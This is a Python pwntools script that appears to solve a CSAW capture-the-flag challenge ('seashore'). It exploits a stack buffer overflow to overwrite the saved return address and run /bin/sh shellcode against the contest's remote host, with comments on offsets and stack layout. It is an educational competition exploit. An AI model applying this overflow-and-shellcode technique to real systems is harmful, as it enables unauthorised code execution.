from pwn import *

# Replace this with whatever term you use and the "execute" call to run gdb in it
context.terminal = ['konsole', '-e']
context.arch = 'amd64'


# Break in GDB and print saved RIP addr and the addr of our buffer ($rdi right before gets call)
buf_offs = 0x7fffffffe760
eip_offs = 0x7fffffffe788
# Calculate the difference between BUF and SRIP (this is how much space we have to write to overwrite SRIP
offs_diff = eip_offs - buf_offs

print("exploit len: {}".format(hex(offs_diff)))

# Used to test locally
# p = process('./seashore')
# Open a remote to the server once I was done testing this sploit
p = remote('pwn.chal.csaw.io', 1003)

# Opens GDB in another terminal, used to debug the code
"""
gdb.attach(p, '''
break
''')
"""

# The first printout: Describe your ideal seashore\n
out_a = p.recvline()
print("got: " + out_a)
# The second printout (contains the addr of buf, checked in GDB that it's the same).
out_b = p.recvline()
print("got: " + out_b)
# Process the output to extract the buf address from the output
buf_addr = out_b.split()[-1]
buf_addr = "0x" + buf_addr
# Calculate the address I need to jump to. I ended up setting up like this:
"""
+--------------------------+
|  ...                     |
+--------------------------+
|  MAIN SRIP               |
+--------------------------+
|  MAIN STUFF              |
+--------------------------+
|  NOP PADDING             |
+--------------------------+
|  SHELLCODE               |
+--------------------------+
"""
# This setup was because when i placed the code inside the stack frame for main, that frame gets royally
# fucked when main returns, so placing my shellcode there led to it not executing correctly. Solution: just move it!
bufaddr_offset = 0x28 + 0x8
# Print it for easy debugs
print("target addr: " + hex(int(buf_addr, 16) + bufaddr_offset))


# I tested several shellcodes because I thought I was having a problem with shellcode executing
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
print("shellcode size: " + str(len(shellcode)))

# Construct the payload
payload = ''
payload += '\x90' * 0x3 + '\x00' * 0x1 # We want to make sure printf doesn't segfault, so let's make the first part of the buf
                                       # a valid null-terminated string
payload += '\x90' * 0x4 # some padding, I didn't move this because lazy
jumpin = len(payload) # just for calculations
#payload += shellcode
payload += '\x90' * (offs_diff - jumpin)  # again I could have done the above and this in one step, this is the same as '0x90' * offs_diff
payload += p64(int(buf_addr, 16) + bufaddr_offset) # overwrite saved RIP with the address of my code (this is the buf addr + 40 + the size of the saved RIP overwrite
payload += '\x90' * 0x4 # some pad for the shellcode in case I messed up
payload += shellcode # the code

p.sendline(payload) # send the exploit
p.interactive() # get shell :)
